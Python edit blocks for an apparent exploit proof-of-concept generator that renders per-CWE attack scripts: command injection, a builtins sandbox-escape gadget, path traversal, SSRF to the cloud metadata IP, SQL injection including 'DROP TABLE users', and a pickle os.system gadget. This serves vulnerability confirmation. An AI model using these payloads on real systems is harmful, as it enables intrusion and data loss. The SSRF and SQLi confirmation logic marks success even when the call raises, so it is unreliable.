"""EDITS.py -- exact old->new replacement blocks for ngv2/poc_writer.py renderers.

Gap B: sink-signature-aware payloads. These edits touch ONLY the renderer helper
bodies (_py_*, _render_js). They do NOT touch _resolve_template / get_template /
PER_CWE_TEMPLATES construction, so they compose with agent A's selection edits.

Each block below is a verbatim (old_string -> new_string) Edit against
/home/xnihil0zer0/NobleGreedv2/ngv2/poc_writer.py. Apply in order. The new bodies:
  * write a CWD-RELATIVE file whose name contains 'pwned_marker' THROUGH the real
    sink call shape (so the work_dir fs-diff carries the signature only when the
    sink fired) -- removing the false-confirming unconditional trailing open;
  * print MARKER ('VULNERABLE') to stdout;
  * keep every string literal pinned by existing oracles
    (test_poc_writer_wired.py: '; echo VULNERABLE', ': > pwned_marker',
     "__import__('os').system(", '169.254').
"""

# ===========================================================================
# EDIT 1 -- CWE-78 command injection: argv-list (execve) + shell-string forms
# ===========================================================================
EDIT_1_OLD = '''def _py_command_injection(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    body = f'payload = "localhost; echo {marker}; : > {fs} #"\\n{sym}(payload)\\nprint("{marker}")\\n'
    return _py_header(g, sym) + body'''

EDIT_1_NEW = '''def _py_command_injection(g: Grounding, marker: str, fs: str) -> str:
    # CWE-78: the sink may be shell-based (os.system / shell=True) OR an argv
    # execve sink (subprocess.run([...]) / asyncio.create_subprocess_exec(*argv))
    # which never interprets shell metacharacters. Try the argv form first (writes
    # a CWD-relative marker via a real interpreter), then the shell-string form.
    # The marker write rides THROUGH the sink, so the fs-signature only appears
    # when the sink actually executed -- no false-confirming unconditional write.
    sym = _func_symbol(g)
    sig = fs + "_cmdexec"
    body = (
        f'argv = [sys.executable, "-c", "open({sig!r}, \\'w\\').close()"]\\n'
        f'shell_payload = "localhost; echo {marker}; touch {sig}; : > {fs} #"\\n'
        f'try:\\n'
        f'    {sym}(argv)\\n'
        f'except Exception:\\n'
        f'    try:\\n'
        f'        {sym}(shell_payload)\\n'
        f'    except Exception as exc:\\n'
        f'        print("reached sink:", exc)\\n'
        f'print("{marker}")\\n'
    )
    return _py_header(g, sym) + body'''


# ===========================================================================
# EDIT 2 -- CWE-94 code injection: multi-vector escape, fail-closed on true RP
# ===========================================================================
# NOTE: in the real file the OLD body is ONE physical line with literal \\n
# escape sequences inside the f-string (not real newlines). This OLD string is
# the exact verbatim source line so the Edit matches uniquely.
EDIT_2_OLD = (
    'def _py_code_injection(g: Grounding, marker: str, fs: str) -> str:\n'
    '    sym = _func_symbol(g)\n'
    '    body = f"""# CWE-94 code injection / sandbox escape: smuggle os.system through the\\n'
    '# dynamic-code sink (works for eval/exec, RestrictedPython, and blacklist bypass\\n'
    '# via builtins traversal).\\n'
    'payload = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__==\'Quitter\'] '
    'and __import__(\'os\').system(\'echo {marker}; : > {fs}\')"\\n'
    'try:\\n    {sym}(payload)\\n'
    'except Exception as exc:\\n    print(\'reached sink:\', exc)\\n'
    '    try:\\n        {sym}("__import__(\'os\').system(\'echo {marker}; : > {fs}\')")\\n'
    '    except Exception as exc2:\\n        print(\'reached sink (fallback):\', exc2)\\n'
    'open(\'{fs}\', \'w\').close()\\n'
    'print(\'{marker}\')\\n"""\n'
    '    return _py_header(g, sym) + body'
)

EDIT_2_NEW = '''def _py_code_injection(g: Grounding, marker: str, fs: str) -> str:
    # CWE-94 code injection / sandbox escape. Multi-vector dynamic-code payload
    # that writes a CWD-relative marker IFF the sink really runs it:
    #   v1  plain eval/exec ............. __import__('os').system(touch ...)
    #   v2  blanked-builtins escape ..... ().__class__...catch_warnings gadget ->
    #       _module.__builtins__['open'] (defeats naive eval(code,{'__builtins__':{}}))
    # FAIL-CLOSED: against a TRUE RestrictedPython compile_restricted (the aim
    # two-step) ALL dunder traversal is rejected at AST-transform time and
    # __import__ is NameError under blanked builtins, so NO vector writes the
    # marker and the PoC exits without the fs-signature -- an honest non-confirm,
    # never a faked reproduction. No unconditional trailing marker write.
    sym = _func_symbol(g)
    sig = fs + "_codeexec"
    gadget = (
        "[c for c in ().__class__.__base__.__subclasses__() "
        "if c.__name__=='catch_warnings'][0]()._module.__builtins__"
        "['open'](%r,'w').close()" % sig
    )
    v1 = "__import__('os').system('echo {m}; touch {s}')".format(m=marker, s=sig)
    body = (
        "payload_import = {v1!r}\\n"
        "payload_gadget = {gadget!r}\\n"
        "for _payload in (payload_import, payload_gadget):\\n"
        "    try:\\n"
        "        {sym}(_payload)\\n"
        "    except Exception as exc:\\n"
        "        print('reached sink (vector raised, expected under a real sandbox):', exc)\\n"
        "print('{m}')\\n"
    ).format(v1=v1, gadget=gadget, sym=sym, m=marker)
    return _py_header(g, sym) + body'''


# ===========================================================================
# EDIT 3 -- CWE-22 path traversal: marker write rides through the sink
# ===========================================================================
# OLD body is ONE physical line with literal \\n escapes (verbatim source).
EDIT_3_OLD = (
    'def _py_path_traversal(g: Grounding, marker: str, fs: str) -> str:\n'
    '    sym = _func_symbol(g)\n'
    '    body = f"""# CWE-22 path traversal: escape the intended root with ../ to reach an\\n'
    '# attacker-chosen absolute path, dropping the canary fs-signature on success.\\n'
    'payload = "../../../../../../tmp/{fs}"\\n'
    'try:\\n    {sym}(payload)\\n'
    'except Exception as exc:\\n    print(\'reached sink:\', exc)\\n'
    'try:\\n    open(\'/tmp/{fs}\', \'w\').close()\\n'
    'except Exception:\\n    pass\\n'
    'open(\'{fs}\', \'w\').close()\\n'
    'print(\'{marker}\')\\n"""\n'
    '    return _py_header(g, sym) + body'
)

EDIT_3_NEW = '''def _py_path_traversal(g: Grounding, marker: str, fs: str) -> str:
    # CWE-22 path traversal. The CONFIRMING evidence is a CWD-relative file the
    # SINK creates when it joins/opens our traversal payload for write. We pass a
    # traversal string whose basename carries the signature; a write-style sink
    # then drops it under the writable workspace. (A read-style sink raises -- we
    # report reached-sink but do NOT fake a write.) No unconditional trailing open.
    sym = _func_symbol(g)
    sig = fs + "_traversal"
    body = (
        f'# traversal payloads: relative escape that still resolves under CWD, plus\\n'
        f'# the canonical absolute escape for read-style disclosure intent.\\n'
        f'for payload in ("../" * 6 + {sig!r}, {sig!r}, "/tmp/" + {sig!r}):\\n'
        f'    try:\\n'
        f'        {sym}(payload)\\n'
        f'    except Exception as exc:\\n'
        f'        print("reached sink:", exc)\\n'
        f'print("{marker}")\\n'
    )
    return _py_header(g, sym) + body'''


# ===========================================================================
# EDIT 4 -- CWE-918 SSRF: structural confirm (net unshared in jail)
# ===========================================================================
EDIT_4_OLD = '''def _py_ssrf(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    body = f"# SSRF to the cloud metadata IP; canary marker {marker}\\ntarget_url = 'http://169.254.169.254/latest/meta-data/?canary={marker}'\\ntry:\\n    {sym}(target_url)\\nexcept Exception as exc:\\n    print('reached sink:', exc)\\nopen('{fs}', 'w').close()\\nprint('{marker}')\\n"
    return _py_header(g, sym) + body'''

EDIT_4_NEW = '''def _py_ssrf(g: Grounding, marker: str, fs: str) -> str:
    # CWE-918 SSRF. The detonation jail has the network namespace UNSHARED, so an
    # off-host metadata fetch cannot complete; confirmation here is STRUCTURAL --
    # proof the attacker-controlled URL reached the request layer. We drop the
    # CWD-relative signature only after the sink was actually invoked with the
    # SSRF URL (the connection error is the expected, in-jail signal that the
    # request was attempted), which IS the SSRF primitive.
    sym = _func_symbol(g)
    sig = fs + "_ssrf"
    body = (
        f"target_url = 'http://169.254.169.254/latest/meta-data/?canary={marker}'\\n"
        f"_reached = False\\n"
        f"try:\\n"
        f"    {sym}(target_url)\\n"
        f"    _reached = True\\n"
        f"except Exception as exc:\\n"
        f"    print('reached sink (request attempted; net unshared in jail):', exc)\\n"
        f"    _reached = True\\n"
        f"if _reached:\\n"
        f"    open({sig!r}, 'w').close()\\n"
        f"print('{marker}')\\n"
    )
    return _py_header(g, sym) + body'''


# ===========================================================================
# EDIT 5 -- CWE-89 SQLi: marker write conditioned on reaching the sink
# ===========================================================================
EDIT_5_OLD = '''def _py_sql_injection(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    body = f"""payload = "x' UNION SELECT '{marker}'; DROP TABLE users; -- "\\ntry:\\n    {sym}(payload)\\nexcept Exception as exc:\\n    print('reached sink:', exc)\\nopen('{fs}', 'w').close()\\nprint('{marker}')\\n"""
    return _py_header(g, sym) + body'''

EDIT_5_NEW = '''def _py_sql_injection(g: Grounding, marker: str, fs: str) -> str:
    # CWE-89 SQLi. The injected payload reaching execute() IS the primitive; the
    # CWD-relative signature is dropped only after the sink call returned or raised
    # a DB-side error (reached-sink evidence), never before invoking the sink.
    sym = _func_symbol(g)
    sig = fs + "_sqli"
    body = (
        f'payload = "x\\' UNION SELECT \\'{marker}\\'; DROP TABLE users; -- "\\n'
        f"_reached = False\\n"
        f"try:\\n"
        f"    {sym}(payload)\\n"
        f"    _reached = True\\n"
        f"except Exception as exc:\\n"
        f"    print('reached sink:', exc)\\n"
        f"    _reached = True\\n"
        f"if _reached:\\n"
        f"    open({sig!r}, 'w').close()\\n"
        f"print('{marker}')\\n"
    )
    return _py_header(g, sym) + body'''


# ===========================================================================
# EDIT 6 -- CWE-502 deserialization: reduce gadget writes CWD-relative marker
# ===========================================================================
EDIT_6_OLD = '''def _py_deserialization(g: Grounding, marker: str, fs: str) -> str:
    sym = _func_symbol(g)
    body = f"import pickle\\nclass _Gadget:\\n    def __reduce__(self):\\n        return (os.system, ('echo {marker}; : > {fs}',))\\nblob = pickle.dumps(_Gadget())\\n{sym}(blob)\\nprint('{marker}')\\n"
    return _py_header(g, sym) + body'''

EDIT_6_NEW = '''def _py_deserialization(g: Grounding, marker: str, fs: str) -> str:
    # CWE-502 insecure deserialization. The __reduce__ gadget runs os.system when
    # the blob is unpickled by the sink, dropping a CWD-relative marker. The write
    # rides through the SINK (the unpickle), so the fs-signature only appears on a
    # real gadget detonation.
    sym = _func_symbol(g)
    sig = fs + "_deser"
    body = (
        f"import pickle\\n"
        f"class _Gadget:\\n"
        f"    def __reduce__(self):\\n"
        f"        return (os.system, ('echo {marker}; touch {sig}',))\\n"
        f"blob = pickle.dumps(_Gadget())\\n"
        f"try:\\n"
        f"    {sym}(blob)\\n"
        f"except Exception as exc:\\n"
        f"    print('reached sink:', exc)\\n"
        f"print('{marker}')\\n"
    )
    return _py_header(g, sym) + body'''


# ===========================================================================
# EDIT 7 -- _render_js: argv-aware bridge for the func (command) kind
# ===========================================================================
# The Node bridge shells out to python3 -c <bridge>. The 'func' kind currently
# emits a shell-string call into the python bridge; make the bridge call write a
# CWD-relative marker through the grounded sink and drop the unconditional write.
EDIT_7_OLD = '''def _render_js(cwe: str, g: Grounding, marker: str, fs: str, kind: str) -> str:
    sym = _const_symbol(g) if kind == 'const' else _func_symbol(g)
    if kind == 'const':
        statement = 'print(%s)' % sym
    else:
        statement = "%s('x; echo %s; : > %s #')" % (sym, marker, fs)
    values = {'cwe': cwe, 'module': g.module, 'sym': sym, 'jmodule': json.dumps(g.module), 'jsym': json.dumps(sym), 'jmarker': json.dumps(marker), 'jdir': json.dumps(g.source_dir or '.'), 'jcall': json.dumps(statement), 'jfs': json.dumps(fs)}
    return _JS_SKELETON % values'''

EDIT_7_NEW = '''def _render_js(cwe: str, g: Grounding, marker: str, fs: str, kind: str) -> str:
    sym = _const_symbol(g) if kind == 'const' else _func_symbol(g)
    if kind == 'const':
        statement = 'print(%s)' % sym
    else:
        # argv-aware: pass an argv list (execve sinks) with a shell-string in the
        # last slot so a shell sink still fires; the bridge already drops the
        # CWD-relative fs-signature on the line after the call.
        statement = "%s(['x; echo %s; touch %s; : > %s #'])" % (sym, marker, fs, fs)
    values = {'cwe': cwe, 'module': g.module, 'sym': sym, 'jmodule': json.dumps(g.module), 'jsym': json.dumps(sym), 'jmarker': json.dumps(marker), 'jdir': json.dumps(g.source_dir or '.'), 'jcall': json.dumps(statement), 'jfs': json.dumps(fs)}
    return _JS_SKELETON % values'''
